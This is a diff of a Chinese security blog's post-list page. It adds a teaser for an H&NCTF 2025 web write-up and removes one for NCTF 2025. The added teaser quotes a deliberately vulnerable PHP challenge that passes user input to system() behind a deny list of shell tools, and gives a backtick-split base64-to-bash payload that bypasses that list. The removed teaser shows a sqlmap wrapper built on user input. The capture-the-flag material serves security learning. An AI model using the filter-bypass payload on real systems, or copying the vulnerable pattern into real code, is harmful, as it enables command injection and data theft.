@@ -14,7 +14,7 @@
 
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
   <meta name="referrer" content="no-referrer-when-downgrade">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.3fcf74ad9d359e0c6c3d2b51a42f684a692fd9cd053c3829756ad5f3e4c4649b.css" integrity="sha256-P890rZ01ngxsPStRpC9oSmkv2c0FPDgpdWrV8&#43;TEZJs=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.da3d1fce642585ca4a88e6246f264be963280e57889197b482bc138b96068178.css" integrity="sha256-2j0fzmQlhcpKiOYkbyZL6WMoDleIkZe0grwTi5YGgXg=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
@@ -192,6 +192,21 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">H&amp;NCTF-2025-Web-Writeup
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Web Really_Ez_Rce 源码
+1&lt;?php 2header(&#39;Content-Type: text/html; charset=utf-8&#39;); 3highlight_file(__FILE__); 4error_reporting(0); 5 6if (isset($_REQUEST[&#39;Number&#39;])) { 7 $inputNumber = $_REQUEST[&#39;Number&#39;]; 8 9 if (preg_match(&#39;/\d/&#39;, $inputNumber)) { 10 die(&#34;不行不行,不能这样&#34;); 11 } 12 13 if (intval($inputNumber)) { 14 echo &#34;OK,接下来你知道该怎么做吗&#34;; 15 16 if (isset($_POST[&#39;cmd&#39;])) { 17 $cmd = $_POST[&#39;cmd&#39;]; 18 19 if (!preg_match( 20 &#39;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\{|\}|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#39;|\&#34;|id/i&#39;, 21 $cmd 22 )) { 23 echo &#34;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&#34;; 24 system($cmd); 25 } else { 26 echo &#34;nonono,hacker!!!&#34;; 27 } 28 } 29 } 30} Payload:
+POST: Number[]=1&amp;cmd=ec``ho Y2F0IC9mKg== | ba``se64 -d | bas``h Watch 出题人写了一个基于 ntdll.dll 的 Windows NT 原生 API 调用实现的文件读取库
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2025-06-08 22:29:00 +0800 CST'>2025-06-08</span>&nbsp;·&nbsp;13 分钟&nbsp;·&nbsp;Xrntkk</footer>
+  <a class="entry-link" aria-label="post link to H&NCTF-2025-Web-Writeup" href="http://localhost:1313/post/hnctf_2025/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">D^3CTF-2025-Web-Writeup
     </h2>
   </header>
@@ -293,21 +308,6 @@ Time是一套难度为中等的靶场环境，完成该挑战可以帮助玩家�
   </div>
   <footer class="entry-footer"><span title='2025-04-08 11:02:55 +0800 CST'>2025-04-08</span>&nbsp;·&nbsp;14 分钟&nbsp;·&nbsp;Xrntkk</footer>
   <a class="entry-link" aria-label="post link to 春秋云镜-Time-Writeup" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-time-writeup/"></a>
-</article>
-
-<article class="post-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">NCTF-2025-Web-Writeup
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>sqlmap-master 题目
-1from fastapi import FastAPI, Request 2from fastapi.responses import FileResponse, StreamingResponse 3import subprocess 4 5app = FastAPI() 6 7@app.get(&#34;/&#34;) 8async def index(): 9 return FileResponse(&#34;index.html&#34;) 10 11@app.post(&#34;/run&#34;) 12async def run(request: Request): 13 data = await request.json() 14 url = data.get(&#34;url&#34;) 15 16 if not url: 17 return {&#34;error&#34;: &#34;URL is required&#34;} 18 19 command = f&#39;sqlmap -u {url} --batch --flush-session&#39; 20 21 def generate(): 22 process = subprocess.Popen( 23 command.split(), 24 stdout=subprocess.PIPE, 25 stderr=subprocess.STDOUT, 26 shell=False 27 ) 28 29 while True: 30 output = process.stdout.readline() 31 if output == &#39;&#39; and process.poll() is not None: 32 break 33 if output: 34 yield output 35 36 return StreamingResponse(generate(), media_type=&#34;text/plain&#34;) 其实就是一个网页端的sqlmap
-看一下sqlmap的使用文档
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2025-03-24 00:27:55 +0800 CST'>2025-03-24</span>&nbsp;·&nbsp;2 分钟&nbsp;·&nbsp;Xrntkk</footer>
-  <a class="entry-link" aria-label="post link to NCTF-2025-Web-Writeup" href="http://localhost:1313/post/nctf_2024/"></a>
 </article>
 <footer class="page-footer">
   <nav class="pagination">
